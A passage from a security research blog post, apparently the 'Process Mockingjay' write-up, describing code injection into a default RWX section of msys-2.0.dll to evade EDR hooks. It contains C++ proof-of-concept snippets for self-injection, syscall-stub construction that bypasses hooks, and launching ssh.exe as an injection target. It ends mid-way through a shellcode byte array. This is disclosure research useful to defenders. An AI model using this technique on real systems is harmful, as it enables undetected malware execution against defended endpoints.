monitored system calls. </span></span></p></div><div type="paragraph" data-hook="rcv-block41"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-2igos"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block42"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bef9c"><span class="akGp8"><span>Upon analyzing various publicly available techniques for injecting code into the memory space of Windows processes, we observed that two fundamental operations were consistently present. These operations involved allocating memory space and setting the protections of this memory section to Read-Write-Execute (RWX), enabling the injected code to be written and executed seamlessly. However, both of these operations were performed using the Syscalls </span><em style="font-style:italic"><span>NtWriteVirtualMemory </span></em><span>and </span><em style="font-style:italic"><span>NtProtectVirtualMemory</span></em><span>, which are closely monitored by EDRs.</span></span></p></div><div type="paragraph" data-hook="rcv-block43"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-erqfl"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block44"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-ab0v6"><span class="akGp8"><span>Considering the significance of these Syscalls and the monitoring hooks implemented by EDRs on such functions, we decided to take a different approach to inject and execute our code in memory. Our strategy involved searching for pre-existing PE files within the Windows OS that contained default RWX sections in their structure. By leveraging these existing sections, we could eliminate the need to allocate space and set protections on separate sections. </span></span></p></div><div type="paragraph" data-hook="rcv-block45"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-e5150"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block46"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-2a544"><span class="akGp8"><span>To accomplish this, we divided the research into two distinct stages:</span></span></p></div><div type="paragraph" data-hook="rcv-block47"></div><div data-breakout="normal"><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-c7pri"><span class="akGp8"><span>To identify a vulnerable DLL that possessed a default Read-Write-Execute (RWX) memory section. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-3gkiu"><span class="akGp8"><span>To implement the process injection technique abusing the RWX memory section already present in the DLL previously found.</span></span></p></li></ul></div><div type="bulleted_list" data-hook="rcv-block48"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bgish"><span class="akGp8"><span>Each of these stages and their technical details are presented in the following subsections.</span></span></p></div><div type="paragraph" data-hook="rcv-block49"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-b439o"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block50"></div><div data-breakout="normal"><h3 class="Tu1-z AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-7julh"><span class="qKwSW"><span>Finding the Vulnerable DLL</span></span></h3></div><div type="heading" data-hook="rcv-block51"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-cmhq7"><span class="akGp8"><span>In our pursuit of injecting code into pre-existing memory sections that possessed Read-Write-Execute (RWX) permissions, we embarked on a comprehensive exploration of libraries within the Windows OS. To facilitate this endeavor, we developed a dedicated tool that systematically traversed the entire file system, meticulously searching for DLLs that exhibited the specific characteristic of default RWX sections.</span></span></p></div><div type="paragraph" data-hook="rcv-block52"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bcpl7"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block53"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bq0kk"><span class="akGp8"><span>Through this systematic exploration, our application thoroughly examined each DLL encountered, evaluating their memory sections to determine if any default RWX sections were present. This approach enabled us to identify potential candidates that could serve as suitable targets for code injection without triggering the attention of defensive software.</span></span></p></div><div type="paragraph" data-hook="rcv-block54"></div><div data-breakout="normal"><div class="CKjkL" id="viewer-en150"><div class="QwCqz wd7R1"><figure class="_0TCNT" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="LZwXu"><div style="--dim-height:678;--dim-width:1821;--ricos-image-default-border-color:unset" id="en150" class="s6q7U EjY43 N8UDE" data-hook="image-viewer-en150"><wow-image id="e17082_963ae3fd15924dcfb8707cf901103196~mv2.png" class="undefined lhz4O" data-image-info="{&quot;containerId&quot;:&quot;en150&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1821,&quot;height&quot;:678,&quot;uri&quot;:&quot;e17082_963ae3fd15924dcfb8707cf901103196~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG en150" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/e17082_963ae3fd15924dcfb8707cf901103196~mv2.png/v1/fill/w_49,h_18,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/e17082_963ae3fd15924dcfb8707cf901103196~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution" data-pin-media="https://static.wixstatic.com/media/e17082_963ae3fd15924dcfb8707cf901103196~mv2.png/v1/fill/w_1821,h_678,al_c,q_90/e17082_963ae3fd15924dcfb8707cf901103196~mv2.png" draggable="false"></wow-image></div><button class="TmdpQ" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="FuKsb"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block55"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-3rihk"><span class="akGp8"><span>As depicted in the aforementioned figure, our comprehensive search across the file system successfully led us to the discovery of the DLL </span><em style="font-style:italic"><span>msys-2.0.dll (</span></em><strong style="font-weight:700"><span style="color:#008812;text-decoration:inherit"><span>in green</span></span></strong><span>), inside Visual Studio 2022 Community. </span></span></p></div><div type="paragraph" data-hook="rcv-block56"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-78bvd"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block57"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7na2q"><span class="akGp8"><span>Remarkably, this DLL possesses a </span><em style="font-style:italic"><span>default RWX section</span></em><span> that could potentially be exploited to load malicious code. The validity of this finding was substantiated when we opened the DLL using PE-Bear, as shown in the figure below.</span></span></p></div><div type="paragraph" data-hook="rcv-block58"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-b2064"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block59"></div><div data-breakout="normal"><div class="CKjkL" id="viewer-eoo79"><div class="QwCqz wd7R1"><figure class="_0TCNT" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="LZwXu"><div style="--dim-height:610;--dim-width:1896;--ricos-image-default-border-color:unset" id="eoo79" class="s6q7U EjY43 N8UDE" data-hook="image-viewer-eoo79"><wow-image id="e17082_c6cb1655d88845ce9e32e5b46b8bc4df~mv2.png" class="undefined lhz4O" data-image-info="{&quot;containerId&quot;:&quot;eoo79&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1896,&quot;height&quot;:610,&quot;uri&quot;:&quot;e17082_c6cb1655d88845ce9e32e5b46b8bc4df~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG eoo79" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/e17082_c6cb1655d88845ce9e32e5b46b8bc4df~mv2.png/v1/fill/w_49,h_16,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/e17082_c6cb1655d88845ce9e32e5b46b8bc4df~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution" data-pin-media="https://static.wixstatic.com/media/e17082_c6cb1655d88845ce9e32e5b46b8bc4df~mv2.png/v1/fill/w_1896,h_610,al_c,q_90/e17082_c6cb1655d88845ce9e32e5b46b8bc4df~mv2.png" draggable="false"></wow-image></div><button class="TmdpQ" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="FuKsb"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block60"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-an82l"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block61"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-f4j2b"><span class="akGp8"><span>With a generous 16 KB of available RWX space, this DLL presents an ideal location for injecting and executing our code. By leveraging this pre-existing RWX section, we can take advantage of the inherent memory protections it offers, effectively bypassing any functions that may have already been hooked by EDRs. This approach not only circumvents the limitations imposed by userland hooks but also establishes a robust and reliable environment for our injection technique.</span></span></p></div><div type="paragraph" data-hook="rcv-block62"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-aj1l5"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block63"></div><div data-breakout="normal"><h3 class="Tu1-z AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-8cs57"><span class="qKwSW"><span>Injection Mechanisms</span></span></h3></div><div type="heading" data-hook="rcv-block64"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7ssrj"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block65"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bdorf"><span class="akGp8"><span>After identifying the vulnerable DLL that contains a default Read-Write-Execute (RWX) section on disk, we conducted several tests to explore two different methods that could leverage this misconfiguration to execute code in memory. Our objective was to validate whether this RWX section in the DLL could be utilized to minimize the number of Windows APIs required for injecting code into the same process's memory space, as well as injecting code into the memory space of other processes. Both methods exploit the presence of the RWX section in the vulnerable DLL to optimize code injection, thereby increasing the attack's efficiency and potentially evading detection. The details of each method are outlined below. </span></span></p></div><div type="paragraph" data-hook="rcv-block66"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-541m5"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block67"></div><div data-breakout="normal"><h4 class="_2lrd9 AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-bueu5"><span class="qKwSW"><span>Self Injection &amp; EDR Unhooking</span></span></h4></div><div type="heading" data-hook="rcv-block68"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-1g46o"><span class="akGp8"><span>In this approach, our custom application loaded the vulnerable DLL directly using the Windows API </span><em style="font-style:italic"><span>LoadLibraryW </span></em><span>and </span><em style="font-style:italic"><span>GetModuleInformation</span></em><span> . The RWX section within the DLL was utilized to store and execute the injected code. The code snippet below illustrates this process:</span></span></p></div><div type="paragraph" data-hook="rcv-block69"></div><div data-breakout="normal"><pre class="v6Aoa sleG5 nsGWt" dir="auto" id="viewer-fdj6h"><span class=""><span>int </span><span style="color:#eea620;text-decoration:inherit"><span>main</span></span><span>(int argc, char *argv[])
{
    </span><span style="color:#405c9c;text-decoration:inherit"><span>// Load the vulnerable DLL</span></span><span>
    HMODULE hDll = ::</span><span style="color:#eea620;text-decoration:inherit"><span>LoadLibraryW</span></span><span>(</span><span style="color:#00a67d;text-decoration:inherit"><span>L"path_to_vulnerable_dll"</span></span><span>);

    if (hDll == nullptr) {
        </span><span style="color:#405c9c;text-decoration:inherit"><span>// fail</span></span><span>
    }

    MODULEINFO moduleInfo;
    if (!::</span><span style="color:#eea620;text-decoration:inherit"><span>GetModuleInformation</span></span><span>(
      ::</span><span style="color:#eea620;text-decoration:inherit"><span>GetCurrentProcess</span></span><span>(), 
      hDll, 
      &amp;moduleInfo, 
      </span><span style="color:#eea620;text-decoration:inherit"><span>sizeof</span></span><span>(MODULEINFO))
      ) {
        </span><span style="color:#405c9c;text-decoration:inherit"><span>// fail</span></span><span>
    }

    </span><span style="color:#405c9c;text-decoration:inherit"><span>// Access the default RWX section (Vulnerable DLL address + offset)</span></span><span>
    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);
    
    </span><span style="color:#405c9c;text-decoration:inherit"><span>// Write the injected code to the RWX section</span></span><span>
    </span><span style="color:#e9950c;text-decoration:inherit"><span>WriteCodeToSection</span></span><span>(rwxSectionAddr , injectedCode);      
    
    </span><span style="color:#405c9c;text-decoration:inherit"><span>// Execute the injected code</span></span><span>
    </span><span style="color:#e9950c;text-decoration:inherit"><span>ExecuteCodeFromSection</span></span><span>(rwxSectionAddr);
    </span></span></pre></div><div type="code_block" data-hook="rcv-block70"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-2tpb2"><span class="akGp8"><span>By directly loading the vulnerable DLL into the memory space of our custom application, we gain direct access to the default RWX section. This allows us to write and execute our desired code without the need for additional memory allocation or permission setting.</span></span></p></div><div type="paragraph" data-hook="rcv-block71"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-fuhnj"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block72"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-765c3"><span class="akGp8"><span>After calculating the address of the RWX section, we created a structure called </span><em style="font-style:italic"><span>SectionDescriptor </span></em><span>to store both the initial and final addresses of the RWX section. By encapsulating the starting and ending addresses within this structure, we ensure easy access and efficient management of the RWX section throughout the process.</span></span></p></div><div type="paragraph" data-hook="rcv-block73"></div><div data-breakout="normal"><pre class="v6Aoa sleG5 nsGWt" dir="auto" id="viewer-cm616"><span class=""><span style="color:#405c9c;text-decoration:inherit"><span>// Create SectionDescriptor structure</span></span><span>
SectionDescriptor descriptor = SectionDescriptor {
    rwxSectionAddr,
    (LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE)
};</span></span></pre></div><div type="code_block" data-hook="rcv-block74"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" style="padding-top:0px;padding-bottom:0px;line-height:max(0.8em, 1.714em)" dir="auto" id="viewer-ddbh4"><span class="akGp8"><span>Since the purpose of this PoC is solely to demonstrate the usage of misconfigured RWX sections, we opted to implement the </span><a target="_blank" href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf" rel="noopener" class="GKQb5 _9HA3o" data-hook="web-link"><u style="text-decoration:underline"><span>Hell's Gate</span></u></a><span> EDR unhooking technique. Hell's Gate technique involves creating a system call stub within the main executable. It searches for and extracts the system call numbers from a clean </span><strong style="font-weight:700"><span>NTDLL.DLL</span></strong><span> module. These extracted numbers are then passed to the system call stub, enabling the execution of the desired system call. Hell's Gate is a reliable method, but it relies on having an unaltered version of </span><strong style="font-weight:700"><span>NTDLL.DLL</span></strong><span> for accurate system call number retrieval, which involves loading a pristine copy of </span><strong style="font-weight:700"><span>NTDLL.DLL</span></strong><span> directly from disk and extracting the desired syscall numbers by parsing the PE file. While this approach may not be ideal for Red Team scenarios, none of the conducted tests detected this behavior by any EDR. </span></span></p></div><div type="paragraph" data-hook="rcv-block75"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" style="padding-top:0px;padding-bottom:0px;line-height:max(0.8em, 1.714em)" dir="auto" id="viewer-6qql2"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block76"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-v0pr"><span class="akGp8"><span>After loading the vulnerable RWX section into the memory space of our custom application, our next step involved generating the necessary stubs within it. To achieve this, we implemented the following code snippet.</span></span></p></div><div type="paragraph" data-hook="rcv-block77"></div><div data-breakout="normal"><pre class="v6Aoa sleG5 nsGWt" dir="auto" id="viewer-565al"><span class=""><span>LPVOID </span><span style="color:#eea620;text-decoration:inherit"><span>createSyscallStub</span></span><span>(SectionDescriptor &amp;descriptor, LPVOID testLocation, uint32_t syscallNumber)
{
   BYTE stub[] = {
        0x49, 0x89, 0xca,                           // mov r10, rcx
        0xb8, 0x00, 0x00, 0x00, 0x00,               // mov eax, 0x0
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,         // jmp qword ptr [rip]
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    ULONG stubSize = </span><span style="color:#eea620;text-decoration:inherit"><span>sizeof</span></span><span>(stub);

    if (((PBYTE)descriptor.nextStubAddr + stubSize) &gt; descriptor.endSectionAddr) {
        // fail
    }

    memcpy((uint32_t *)&amp;stub[4], &amp;syscallNumber, </span><span style="color:#eea620;text-decoration:inherit"><span>sizeof</span></span><span>(uint32_t));
    memcpy((PVOID *)&amp;stub[14], &amp;testLocation, </span><span style="color:#eea620;text-decoration:inherit"><span>sizeof</span></span><span>(PVOID));

    auto stubAddr = descriptor.nextStubAddr;
    memcpy((PBYTE *)stubAddr, &amp;stub, stubSize);

    </span><span style="color:#eea620;text-decoration:inherit"><span>printf</span></span><span>("[!] Stub created at 0x%p\n", stubAddr);

    descriptor.nextStubAddr = ((PBYTE)descriptor.nextStubAddr) + stubSize;

    return stubAddr;
}
</span></span></pre></div><div type="code_block" data-hook="rcv-block78"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-dt6a"><span class="akGp8"><span>It starts by checking if there is enough space available to accommodate a new stub. If sufficient space is present, the code proceeds to copy the syscall numberfrom the untouched NTDLL.DLL and the address of the test instruction following the jmp added by the EDR. For the sake of brevity, the specific data points obtained through parsing the </span><strong style="font-weight:700"><span>NTDLL.DLL </span></strong><span>are not included here. </span></span></p></div><div type="paragraph" data-hook="rcv-block79"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-8ggsd"><span class="akGp8"><span>By employing this strategy of leveraging the loaded </span><strong style="font-weight:700"><span>NTDLL.DLL</span></strong><span> file from disk, we dynamically re-constructed the original syscall number for each of the functions modified by the EDR. Consequently, all the EDR hooks present within the process were effectively eliminated. </span></span></p></div><div type="paragraph" data-hook="rcv-block80"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7ftcg"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block81"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-6q1qn"><span class="akGp8"><span>The complete process to achieve this can be described as follows: </span></span></p></div><div type="paragraph" data-hook="rcv-block82"></div><div data-breakout="normal"><ol class="Dphjj nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-fuknb"><span class="akGp8"><span>Custom application loads vulnerable DLL using </span><em style="font-style:italic"><span>LoadLibraryW</span></em><span>. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-1mb21"><span class="akGp8"><span>Location of the RWX section is resolved using the base address of the DLL and the offset of section.</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-esdps"><span class="akGp8"><span>A clean copy of NTDLL.DLL is loaded from the disk, and the system call numbers for the desired syscalls are obtained. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-2nkdj"><span class="akGp8"><span>The addresses of the test instructions after the jmp added by the EDR are retrieved from the NTDLL.DLL in-memory copy (hooked by the EDR). </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-d0okq"><span class="akGp8"><span>Using the addresses of the test instructions and the syscall numbers, we assemble our stubs in the RWX area of the vulnerable DLL. </span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:decimal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-7lcbd"><span class="akGp8"><span>When the stub is executed, it prepares the syscall number in the EAX register, as usual, and immediately jumps to the address of the corresponding test instruction for the chosen system call, bypassing the EDR verification step. </span></span></p></li></ol></div><div type="ordered_list" data-hook="rcv-block83"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-a5iip"><span class="akGp8"><span>After conducting the necessary validations, our method has proven to be a successful solution for injecting and executing code. In this case, we were able to inject our own shellcode into the memory space of our custom application </span><strong style="font-weight:700"><span>nightmare.exe</span></strong><span>, without relying on Windows APIs such as NtWriteVirtualMemory and NtProtectVirtualMemory. This complete removal of dependency on Windows APIs not only reduces the likelihood of detection but also enhances the effectiveness of the technique. Notably, the injected shellcode successfully removed all EDR inline userland hooks without triggering any detection. </span></span></p></div><div type="paragraph" data-hook="rcv-block84"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-71qin"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block85"></div><div data-breakout="normal"><h4 class="_2lrd9 AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-buf8g"><span class="qKwSW"><span>Remote Process Injection</span></span></h4></div><div type="heading" data-hook="rcv-block86"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-3inut"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block87"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-fm4u0"><span class="akGp8"><span>The second method we explored involved leveraging the RWX section in the vulnerable DLL to perform process injection in a remote process. This requires identifying non-malicious binaries that depend on the DLL msys-2.0.dll for their operation. </span></span></p></div><div type="paragraph" data-hook="rcv-block88"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-cep71"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block89"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-9b4ji"><span class="akGp8"><span>During our research, we noticed that the </span><a target="_blank" href="https://www.davidegrayson.com/windev/msys2/" rel="noopener" class="GKQb5 _9HA3o" data-hook="web-link"><u style="text-decoration:underline"><span>msys-2.0.dll</span></u></a><span> library is commonly utilized by applications that require POSIX emulation, such as GNU utilities or applications not originally designed for the Windows environment. We found relevant binaries with these characteristics within the Visual Studio 2022 Community subdirectory. </span></span></p></div><div type="paragraph" data-hook="rcv-block90"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-f8lfp"><span class="akGp8"><span>For our proof of concept, we selected the </span><strong style="font-weight:700"><span>ssh.exe</span></strong><span> process located within the Visual Studio 2022 Community directory as the target for injecting our payload. To accomplish this, we initiated the </span><strong style="font-weight:700"><span>ssh.exe</span></strong><span> process as a child process of our custom application using the Windows API CreateProcessW, as presented in the code below. It is worth noting that the arguments passed to the </span><strong style="font-weight:700"><span>ssh.exe</span></strong><span> binary does not need to reference real machines; it is solely used to trigger the execution logic within the </span><strong style="font-weight:700"><span>ssh.exe</span></strong><span> binary.</span></span></p></div><div type="paragraph" data-hook="rcv-block91"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-7daot"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block92"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-10hhe"><span class="akGp8"><span>For our proof of concept, we specifically chose the</span><strong style="font-weight:700"><span> ssh.exe</span></strong><span> process located in the Visual Studio directory to inject our payload. It is important to note that in this injection method, there is no need to explicitly create a thread within the target process, as the process automatically executes the injected code. This inherent behavior makes it challenging for Endpoint Detection and Response (EDR) systems to detect this method.</span></span></p></div><div type="paragraph" data-hook="rcv-block93"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-78uac"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block94"></div><div data-breakout="normal"><pre class="v6Aoa sleG5 nsGWt" dir="auto" id="viewer-591v6"><span class=""><span>LPTSTR command = L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\ssh.exe";  
    LPTSTR args = L"ssh.exe decoy@decoy.dom";  
    STARTUPINFOW si;  
    PROCESS_INFORMATION pi;  
    ZeroMemory(&amp;si, sizeof(si));  
    si.cb = sizeof(si);  
    ZeroMemory(&amp;pi, sizeof(pi));  
    DWORD dwCreationFlags = 0;  
    BOOL success = ::CreateProcessW(  
        command,  
        args,  
        nullptr,  
        nullptr,  
        FALSE,  
        dwCreationFlags | DEBUG_ONLY_THIS_PROCESS | DEBUG_PROCESS, 
        nullptr,  
        nullptr,  
        &amp;si,  
        &amp;pi);</span></span></pre></div><div type="code_block" data-hook="rcv-block95"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-1lcqr"><span class="akGp8"><span>After creating the process and allowing it to execute the provided command line arguments, the next step is to open the process and move the payload directly into the Read-Write-Execute (RWX) section. This can be accomplished using the OpenProcess and WriteProcessMemory Windows APIs, as demonstrated in the code snippet below:</span></span></p></div><div type="paragraph" data-hook="rcv-block96"></div><div data-breakout="normal"><pre class="v6Aoa sleG5 nsGWt" dir="auto" id="viewer-beiod"><span class=""><span>/*unsigned char buf[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
